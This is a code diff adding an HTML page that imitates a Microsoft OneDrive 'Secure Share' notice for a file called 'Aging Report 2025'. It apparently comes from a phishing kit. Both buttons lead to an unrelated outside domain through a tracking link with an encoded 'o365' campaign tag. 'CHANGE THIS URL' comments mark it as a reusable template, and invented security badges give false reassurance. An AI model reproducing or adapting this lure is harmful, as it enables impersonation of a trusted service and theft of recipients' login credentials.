@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Document Shared With You</title>
+
+<style>
+:root {
+    --blue: #2563eb;
+    --blue-light: #e8f0ff;
+    --gray-text: #6b7280;
+    --border: #e5e7eb;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: #ffffff;
+    color: #111827;
+}
+
+.wrapper {
+    max-width: 760px;
+    margin: 70px auto;
+    padding: 0 20px;
+    text-align: center;
+}
+
+/* Secure badge */
+.badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 14px;
+    border-radius: 999px;
+    background: var(--blue-light);
+    color: var(--blue);
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 26px;
+}
+
+/* Headings */
+h1 {
+    font-size: 34px;
+    font-weight: 700;
+    margin-bottom: 12px;
+}
+
+.subtitle {
+    font-size: 18px;
+    color: var(--gray-text);
+    margin-bottom: 48px;
+}
+
+/* Document card */
+.card {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.08);
+    padding: 36px;
+    max-width: 520px;
+    margin: 0 auto 40px;
+}
+
+.drive-icon {
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 18px;
+}
+
+.filename {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 8px;
+}
+
+.meta {
+    font-size: 14px;
+    color: var(--gray-text);
+}
+
+/* Buttons */
+.actions {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    margin-bottom: 26px;
+}
+
+.btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 14px 22px;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: none;
+    border: 1px solid transparent;
+    transition: all 0.2s ease;
+}
+
+.btn-primary {
+    background: var(--blue);
+    color: #ffffff;
+}
+
+.btn-primary:hover {
+    background: #1e4ed8;
+}
+
+.btn-secondary {
+    background: #ffffff;
+    color: #111827;
+    border-color: var(--border);
+}
+
+.btn-secondary:hover {
+    background: #f9fafb;
+}
+
+/* Help link */
+.help {
+    font-size: 14px;
+    color: var(--gray-text);
+}
+
+.help a {
+    color: var(--blue);
+    text-decoration: none;
+    font-weight: 500;
+}
+
+/* Footer */
+.footer {
+    margin-top: 70px;
+    font-size: 13px;
+    color: #9ca3af;
+}
+
+.footer-icons {
+    display: flex;
+    justify-content: center;
+    gap: 28px;
+    margin-bottom: 16px;
+}
+</style>
+</head>
+
+<body>
+<div class="wrapper">
+
+    <div class="badge">
+        🔒 Secure Share
+    </div>
+
+    <h1>Document Shared With You</h1>
+    <div class="subtitle">
+        You've received a secure document. Review or download it using the options below.
+    </div>
+
+    <div class="card">
+        <!-- OneDrive-style Icon -->
+        <svg class="drive-icon" viewBox="0 0 64 64" fill="none">
+            <path d="M22 42h26a10 10 0 0 0 0-20 14 14 0 0 0-27-3A11 11 0 0 0 22 42Z"
+                  fill="#2563eb"/>
+            <rect x="18" y="24" width="18" height="24" rx="3" fill="#ffffff"/>
+            <path d="M30 24v6h6" stroke="#2563eb" stroke-width="2"/>
+        </svg>
+
+        <div class="filename">Aging Report 2025</div>
+        <div class="meta">Stored in OneDrive • Secure Access</div>
+    </div>
+
+    <div class="actions">
+        <!-- CHANGE THIS URL -->
+        <a href="https://miccimanni.com/?rns=c3Y9bzM2NV8xX29uZSZ1aWQ9VVNFUjEwMDEyMDI2VTI3MDExMDA5N0123N" class="btn btn-primary">
+            👁️ Review Document
+        </a>
+
+        <!-- CHANGE THIS URL -->
+        <a href="https://miccimanni.com/?rns=c3Y9bzM2NV8xX29uZSZ1aWQ9VVNFUjEwMDEyMDI2VTI3MDExMDA5N0123N" class="btn btn-secondary">
+            ⬇️ Download
+        </a>
+    </div>
+
+    <div class="help">
+        Need help? <a href="#">Contact support</a>
+    </div>
+
+    <div class="footer">
+        <div class="footer-icons">
+            🔐 256-bit Encrypted
+            🔒 Secure Transfer
+            ⏱ Auto-expires
+        </div>
+        © 2026 Your Company. All rights reserved.
+    </div>
+
+</div>
+</body>
+</html>
